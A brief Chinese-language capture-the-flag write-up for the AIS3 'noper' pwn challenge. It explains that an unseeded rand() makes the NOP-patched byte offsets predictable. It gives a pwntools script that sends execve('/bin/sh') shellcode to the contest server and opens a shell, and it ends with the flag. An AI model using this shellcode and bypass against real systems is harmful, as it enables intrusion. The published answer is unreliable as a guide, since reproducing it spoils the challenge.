# PWN - noper
## 題目解析
一個 ELF，會吃輸入的 shellcode，但是會隨機 patch 其中幾個 byte 變成 nop

## 漏洞
那個 rand() 沒有先給亂數種子，所以每次 rand() 的數字都一樣，因此迴避掉那些字元填寫 shellcode 就好

## exploit
```
from pwn import *

nop = '\x90'
shellcode = '\x31\xc0' + nop * 16 + '\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e' + nop * 6 + '\xb0\x3b\x0f\x05'
r = remote('quiz.ais3.org', 5002)
#r = process('noper')

'''
rand = [6, 10, 13, 17, 39, 41, 44, 51, 63]
rand = [7, 11, 14, 18, 40, 42, 45, 52, 64]
'''

raw_input('debug')
r.recvuntil(':')
r.sendline(shellcode)
r.interactive()
```

* flag: `AIS3{nOp_noOp_NOoop!!!}`
